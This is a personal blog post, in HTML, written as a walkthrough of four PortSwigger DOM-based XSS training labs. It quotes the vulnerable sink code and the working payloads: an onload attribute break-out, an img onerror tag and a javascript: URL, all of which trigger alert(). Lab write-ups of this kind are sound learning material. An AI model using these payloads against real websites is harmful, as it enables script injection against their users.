@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>WSA: Apprentice DOM Based XSS</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="description" content="collection of solution to 4 dom based xss labs on Web Security Academy by PortSwigger" />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">WSA: Apprentice DOM Based XSS</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org53b8a42">Introduction</a></li>
+<li><a href="#org39bdd68">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
+<li><a href="#org1d394f4">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
+<ul>
+<li><a href="#orga3ca358">Why did not the first payload work?</a></li>
+</ul>
+</li>
+<li><a href="#org01fd45e">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
+<li><a href="#org8e28b91">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
+<ul>
+<li><a href="#orgfcb9c14">Update after: Intigrity explanaation video</a></li>
+</ul>
+</li>
+<li><a href="#orgeb1717b">Summary</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org53b8a42" class="outline-2">
+<h2 id="org53b8a42"><a href="#org53b8a42">Introduction</a></h2>
+<div class="outline-text-2" id="text-org53b8a42">
+<p>
+If you have played around CTFs it is highly likely<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> that you have
+encountered one of the common forms of cross-site scripting (XSS):
+</p>
+<ul class="org-ul">
+<li>Reflected</li>
+<li>Stored</li>
+</ul>
+<p>
+And for good reason, since they are (in these scenarios) easy to spot
+and can usually be bundled with other techniques for <i>more damage</i>.
+</p>
+
+<p>
+One other technique, the overlooked one as stated <a href="http://www.webappsec.org/projects/articles/071105.shtml">here</a>, is DOM Based
+XSS, which occurs without any extra client-server interaction. In
+fact, DOM Based XSS takes advantage of the code that is included in
+the web page, and relies on user input to produce a certain outcome.
+The code does not (need to?) contact the web server, but manipulates
+the page&rsquo;s contents based on a query.
+</p>
+
+<p>
+In the <a href="#org39bdd68">first example</a>, taken from Web Security Academy by PortSwigger,
+that query is a search field, but it could be a parameter, or &#x2026; a
+hashchange as shown in the last lab. Feel free to make any
+corrections/suggestions in the comment section.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org39bdd68" class="outline-2">
+<h2 id="org39bdd68"><a href="#org39bdd68">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-org39bdd68">
+<div class="org-src-container">
+<pre class="src src-js" id="orgba9314f">function trackSearch(query) {
+    document.write('&lt;img src="/resources/images/tracker.gif?searchTerms='+query+'"&gt;');
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    trackSearch(query);
+}
+</pre>
+</div>
+
+<pre class="example" id="orgaec621d">
+" onload="alert()
+&lt;img src="/resources/images/tracker.gif?searchTerms=" onload="alert()"&gt;
+</pre>
+</div>
+</div>
+
+<div id="outline-container-org1d394f4" class="outline-2">
+<h2 id="org1d394f4"><a href="#org1d394f4">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-org1d394f4">
+<p>
+After navigating the site just a little bit we see that in the search
+page there is this embedded script snippet:
+</p>
+<div class="org-src-container">
+<pre class="src src-js" id="org7ae4433">function doSearchQuery(query) {
+    document.getElementById('searchMessage').innerHTML = query;
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    doSearchQuery(query);
+}
+</pre>
+</div>
+<p>
+We see that it takes the parameter <code>search</code>, and adds its contents
+(should they exist) in the <code>innerHTML</code> (namely contents) of an element
+with id <code>searchMessage</code>. Seeing the response more carefully: 
+</p>
+
+<div class="org-src-container">
+<pre class="src src-html" id="org81c298f">&lt;h1&gt;&lt;span&gt;0 search results for
+'&lt;/span&gt;&lt;span id="searchMessage"&gt;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;/h1&gt;
+</pre>
+</div>
+
+<p>
+Testing this payload should be more than enough
+</p>
+<div class="org-src-container">
+<pre class="src src-html" id="org20195c4">&lt;script&gt;alert()&lt;/script&gt;
+</pre>
+</div>
+
+<p>
+While it gets inserted into the page it does not get executed &#x2013;
+another payload should be used. And truly, this second one resulted in
+a <i>solved lab</i>.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-html" id="orga057d8f">&lt;img src="fail" onerror="alert(1)"&gt;
+</pre>
+</div>
+</div>
+
+<div id="outline-container-orga3ca358" class="outline-3">
+<h3 id="orga3ca358"><a href="#orga3ca358">Why did not the first payload work?</a></h3>
+</div>
+</div>
+
+<div id="outline-container-org01fd45e" class="outline-2">
+<h2 id="org01fd45e"><a href="#org01fd45e">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-org01fd45e">
+<div class="org-src-container">
+<pre class="src src-js" id="org44f3d1a">$(function() {
+    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+});
+</pre>
+</div>
+
+<p>
+This occupies an <code>&lt;a&gt;</code> element&rsquo;s <code>href</code>, found by an <code>id="backLink"</code>.
+The thing is that the function being used <code>attr()</code> seems to do a better
+sanitization than what we have already seen, escaping &ldquo;, and &lsquo;, not
+allowing with a plain payload to work
+</p>
+<pre class="example" id="org40b9d6a">
+#does not work
+testaki'&gt; &lt;script&gt;alert()&lt;/script&gt;  
+#produced result
+&lt;a id="backLink" href="/testaki'&gt; &lt;script&gt;alert()&lt;/script&gt;"&gt;Back&lt;/a&gt; 
+</pre>
+
+<p>
+Just a little bit of searching (honestly, it was the first
+stackoverflow post for me), reminded me of a type of link I had
+forgotten: <code>javascript:</code>
+</p>
+
+<pre class="example" id="orgbb7249f">
+javascript:alert(1);
+#produced result
+&lt;a id="backLink" href="javascript:alert(1);"&gt;Back&lt;/a&gt; 
+</pre>
+
+<p>
+This, when clicking the button causes the <code>alert()</code> popup window and
+successfully marks the lab as solved.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org8e28b91" class="outline-2">
+<h2 id="org8e28b91"><a href="#org8e28b91">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-org8e28b91">
+<div class="note" id="orge479ce3">
+<p>
+First time on a room with a <code>Go to exploit server</code> button.
+</p>
+
+</div>
+
+<p>
+In the website&rsquo;s home page there is this interesting js snippet:
+</p>
+<div class="org-src-container">
+<pre class="src src-js" id="org0d49f1f">$(window).on('hashchange', function(){
+    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+    if (post) post.get(0).scrollIntoView();
+});
+</pre>
+</div>
+
+<p>
+Not knowing JavaScript, but barely understanding through transferring
+whatever I could from other languages, this snippet had some work for
+me:
+</p>
+<ul class="org-ul">
+<li>What is a <code>hashchange</code> event:
+<ul class="org-ul">
+<li>If you have ever seen anchors in urls (the snippets starting with
+<code>#</code> - feel free to click on a section title in this post and check
+the url) you know the entry point</li>
+<li>A <code>hashchange</code> event occurs when that <i>parameter</i> changes</li>
+</ul></li>
+<li>What is <code>$()</code> in general? It is a selector (<a href="https://stackoverflow.com/questions/2167544/what-does-the-function-do-in-javascript">source</a>)
+<ul class="org-ul">
+<li>Searching in <a href="https://stackoverflow.com/questions/9501886/jquery-javascript-selector-or">StackOverflow</a>, we see that we can add a , to use
+multiple selectors (even though I am not sure how this could help
+for the time being, since it will only get fed into a <code>scrollIntoView()</code>)</li>
+</ul></li>
+<li>What exactly does <code>slice(1)</code> do? It returns the string from index 1 to
+the end, effectively removing <code>#</code>.</li>
+</ul>
+
+
+<p>
+Getting back to the lab: using links of the following form allows to
+find the post with that word, and move the screen to that.
+</p>
+<pre class="example" id="org45401a9">
+https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Reverse
+https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Watching
+https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Speak
+</pre>
+
+<p>
+Now that we know what it does, how can we escape from it? My naive payload
+does not work, since <code>decodeURIComponent</code> obviously returns a string and
+does not just make a substitution.
+</p>
+<pre class="example" id="orgd74c7d1">
+# what I inserted
+/#')');alert(1); //
+# what I hoped for
+var post = $('section.blog-list h2:contains(' + ')'); alert(1)// + ')');
+</pre>
+
+<p>
+Searching for <code>hashchange XSS</code> seems to only include results related to
+this lab &#x2026; :(
+</p>
+
+
+<p>
+Maybe take advantage of the available web server, so that it calls
+that one instead?
+</p>
+
+<p>
+After tinkering for some time, I viewed the solution. It seems silly
+to me, because I can not understand how this would not work on any
+website. I mean, as far as I can see it does not take advantage of
+<code>hashchange</code> at all, just inserts faulty code at the end of the web
+page.
+</p>
+</div>
+
+
+<div id="outline-container-orgfcb9c14" class="outline-3">
+<h3 id="orgfcb9c14"><a href="#orgfcb9c14">Update after: <a href="https://www.youtube.com/watch?v=JgiX3kyK8ME">Intigrity explanaation video</a></a></h3>
+</div>
+</div>
+
+
+<div id="outline-container-orgeb1717b" class="outline-2">
+<h2 id="orgeb1717b"><a href="#orgeb1717b">Summary</a></h2>
+<div class="outline-text-2" id="text-orgeb1717b">
+<p>
+I think I&rsquo;m missing something so, that&rsquo;s enough labs for today, time
+for some research and theory. 
+</p>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+όπως γνωστός κοσμήτορας ανέφερε τις προηγούμενες ημέρες&#x2026; 
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2024-02-16 Fri 11:27</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
